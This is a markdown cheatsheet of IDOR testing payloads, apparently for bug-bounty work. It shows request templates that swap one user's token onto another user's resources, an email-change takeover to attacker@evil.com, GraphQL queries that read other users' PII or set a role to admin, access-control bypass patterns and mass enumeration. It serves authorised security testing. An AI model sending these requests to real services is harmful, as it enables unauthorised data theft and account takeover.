# IDOR — Payload Cheatsheet

## Detection Methodology

### Step 1: Identify Object References
```
# Direct ID in URL
GET /api/users/123/profile
GET /api/orders/456
GET /api/invoices/789.pdf

# ID in query parameter
GET /api/data?user_id=123
GET /api/export?report_id=456

# ID in POST body
POST /api/update {"id": 123, "email": "new@email.com"}

# ID in headers
X-User-Id: 123
X-Account-Id: 456
```

### Step 2: Determine ID Type
```
Sequential integer:  1, 2, 3, 4 → easy enumeration
UUID v4:             550e8400-e29b-41d4-a716-446655440000 → hard to guess
UUID v1:             time-based → partially predictable
Encoded:             base64(123) = MTIz → decode and enumerate
Hashed:              MD5/SHA of predictable value → precompute
Slug:                /users/john-doe → enumerate known usernames
```

### Step 3: Access Control Testing Matrix

| Action | Own Resource | Other User's Resource | Admin Resource |
|--------|-------------|----------------------|----------------|
| Read   | ✓ baseline  | TEST THIS            | TEST THIS      |
| Update | ✓ baseline  | TEST THIS            | TEST THIS      |
| Delete | ✓ baseline  | TEST THIS            | TEST THIS      |

### Step 4: Swap Auth Context
```
# With User A's token, request User B's resource
GET /api/users/USER_B_ID/profile
Authorization: Bearer USER_A_TOKEN

# With User A's session, modify User B's data
PUT /api/users/USER_B_ID/email
Cookie: session=USER_A_SESSION
{"email": "attacker@evil.com"}
```

## Common IDOR Locations

### API Endpoints
```
/api/v1/users/{id}
/api/v1/accounts/{id}/transactions
/api/v1/organizations/{id}/members
/api/v1/files/{id}/download
/api/v1/messages/{id}
/api/v1/tickets/{id}
/api/v1/invoices/{id}
```

### GraphQL
```graphql
query { user(id: "OTHER_USER_ID") { email, phone, address } }
mutation { updateUser(id: "OTHER_USER_ID", input: {role: "admin"}) { id } }
```

### File Access
```
/uploads/{user_id}/avatar.jpg
/documents/{doc_id}.pdf
/exports/{export_id}.csv
/backups/{timestamp}.zip
```

## Bypass Patterns

### When Direct ID Swap Fails
```
# Try different parameter names
?id=123 → ?user_id=123 → ?uid=123 → ?account=123

# Try array injection
?id[]=123&id[]=456

# Try JSON body instead of query
GET /api/users?id=123 → POST /api/users {"id": 123}

# Try older API versions
/api/v2/users/123 → /api/v1/users/123

# Try different HTTP methods
GET /api/users/123 → PUT /api/users/123

# Try adding the ID to endpoints that don't show it
POST /api/profile/update → POST /api/profile/update?user_id=OTHER

# Wrap in array
{"id": 123} → {"id": [123, 456]}

# Try parameter pollution
/api/users/ME?id=OTHER
```

### UUID Prediction (v1)
```python
# UUID v1 contains timestamp + MAC
# If you have one UUID, you can predict nearby UUIDs
import uuid
# Extract timestamp from known UUID
known = uuid.UUID("6ba7b810-9dad-11d1-80b4-00c04fd430c8")
# Generate adjacent timestamps
```

## Validation Criteria

1. Access DIFFERENT user's data (not your own second account's public data)
2. The data is actually sensitive (PII, financial, private content)
3. The access bypasses an authorization check (not just an unauthenticated endpoint)
4. Reproducible with different target IDs

## Impact Escalation

| Impact | What to demonstrate |
|--------|-------------------|
| PII exposure | Read another user's personal data |
| Financial data | Access invoices, transactions, payment info |
| Account takeover | Modify email/password of another user |
| Mass data extraction | Enumerate all user IDs + extract data |
| Privilege escalation | Access admin resources as regular user |
